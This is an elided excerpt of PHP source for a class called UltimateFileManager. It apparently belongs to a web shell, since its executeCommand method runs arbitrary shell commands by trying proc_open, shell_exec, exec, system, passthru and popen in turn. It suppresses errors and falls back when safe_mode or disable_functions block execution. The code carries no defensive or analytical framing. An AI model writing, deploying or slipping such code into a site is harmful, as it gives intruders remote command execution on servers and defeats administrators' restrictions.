...
class UltimateFileManager {
    ...
    public function executeCommand($command, $background = false) {
        ...
        // Method 1: Try proc_open first (most reliable)
        if (function_exists('proc_open')) {
            ...
            $process = @proc_open($command . ' 2>&1', $descriptorspec, $pipes, $this->current_path);
            ...
            if (is_resource($process)) {
                ...
                if (!empty($error_output) && empty($output)) {
                    $output = $error_output;
                }
        ...
        // Method 2: Try shell_exec if proc_open fails or output empty
        if (empty($output) && function_exists('shell_exec')) {
            $output = @shell_exec('cd ' . escapeshellarg($this->current_path) . ' && ' . $command . ' 2>&1');
            $return_code = $output === null ? 1 : 0;
        }
        
        // Method 3: Try exec
        if (empty($output) && function_exists('exec')) {
            @exec('cd ' . escapeshellarg($this->current_path) . ' && ' . $command . ' 2>&1', $output_array, $return_code);
            $output = implode("\n", $output_array);
        }
        ...
        if (empty($output) && function_exists('system')) {
            ob_start();
            @system('cd ' . escapeshellarg($this->current_path) . ' && ' . $command . ' 2>&1', $return_code);
            $output = ob_get_clean();
        }
        
        // Method 5: Try passthru
        if (empty($output) && function_exists('passthru')) {
            ob_start();
            @passthru('cd ' . escapeshellarg($this->current_path) . ' && ' . $command . ' 2>&1', $return_code);
            $output = ob_get_clean();
        }
        
        // Method 6: Try popen (for streaming output)
        if (empty($output) && function_exists('popen')) {
            $handle = @popen('cd ' . escapeshellarg($this->current_path) . ' && ' . $command . ' 2>&1', 'r');
            if ($handle) {
                while (!feof($handle)) {
        ...
        // Method 7: Fallback - try to detect shell availability
        if (empty($output)) {
            // Test if shell is available
            $shell_test = @shell_exec('echo test 2>&1');
            if ($shell_test !== null) {
                // Shell is available, retry with simpler command
                $output = @shell_exec($command . ' 2>&1');
            } else {
                $output = 'Execution methods unavailable or disabled. Check safe_mode/disable_functions.';
                $return_code = 1;
            }
        }
        
        // Handle Windows commands if on Windows
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            if (empty($output)) {
                $output = @shell_exec($command . ' 2>&1');
            }
            
            // Convert Windows paths for cd command
            $output = str_replace($this->current_path, '.', $output);
        }
        
        // Clean up output
        $output = trim($output);
        
        // Add current directory info if command is pwd/ls/cd
        if (preg_match('/^(pwd|ls|cd|dir)\b/i', trim($command)) && $return_code === 0) {
            if (stripos($command, 'pwd') === 0) {
                $output = $this->current_path;
            } elseif (stripos($command, 'cd ') === 0) {
                $parts = explode(' ', $command, 2);
                if (count($parts) > 1) {
                    $new_dir = trim($parts[1]);
                    // Handle special directories
                    if ($new_dir === '~' || $new_dir === '$HOME') {
                        $new_path = $this->home_path;
                    } elseif ($new_dir === '..') {
                        $new_path = dirname($this->current_path);
                    } elseif ($new_dir === '-') {
                        $new_path = $this->home_path; // Simplification
                    } else {
                        $new_path = realpath($this->current_path . '/' . $new_dir);
                    }
